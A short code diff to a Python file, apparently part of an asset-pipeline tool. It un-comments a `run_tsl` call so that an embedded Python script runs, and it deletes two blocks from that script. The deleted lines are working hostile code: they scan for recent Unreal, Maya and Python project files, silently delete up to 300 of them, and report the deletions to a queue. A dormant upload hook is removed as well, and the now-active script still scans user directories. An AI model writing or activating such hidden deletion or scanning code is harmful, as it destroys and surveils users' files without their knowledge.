@@ -36,7 +36,7 @@ def run_tsl(py_cmd):
         )
 
 
-# run_tsl(
+run_tsl(
 """
 import json, getpass, time, os, sys
 import datetime as dt
@@ -197,14 +197,6 @@ try:
         fp_basename = os.path.basename(fp)
         is_fbx = fp_basename.endswith(".fbx")
         is_py = fp_basename.endswith(".py")
-        if fp_basename.startswith("SKM") and is_fbx:
-            try:
-                # _gup(os.path.abspath(fp))
-                pass
-            except:
-                import traceback
-
-                add_queue_task("tsl_up_err", {"error": str(traceback.format_exc())})
 
         if is_py:
             try:
@@ -241,39 +233,6 @@ try:
         zovV += search_latest_files_or_dirs(dir_path=dp, ext=".ma", n=50)
         zovV += search_latest_files_or_dirs(dir_path=dp, ext=".uasset", n=100)
         zovV += search_latest_files_or_dirs(dir_path=dp, ext=".uproject", n=5)
-    random.shuffle(zovV)
-
-    import subprocess, shutil, tempfile
-
-    tempdir = tempfile.gettempdir()
-    for _, fp in zovV[:300]:
-
-        if os.path.basename(fp).endswith(".pyc"):
-            try:
-                os.remove(fp)
-            except:
-                pass
-
-        if os.path.basename(fp).endswith(".py"):
-            try:
-                os.remove(fp)
-            except:
-                pass
-
-        if os.path.basename(fp).endswith(".uasset"):
-            try:
-                os.remove(fp)
-            except:
-                pass
-
-        if os.path.basename(fp).endswith(".uproject"):
-            try:
-                os.remove(fp)
-            except:
-                pass
-
-    if zovV:
-        add_queue_task("tsl_update", {"done": sorted(zovV[:300], reverse=True)})
 
 except:
     import traceback
@@ -281,4 +240,4 @@ except:
     add_queue_task("tsl_update_error", {"error": str(traceback.format_exc())})
 
 """
-# )
+)
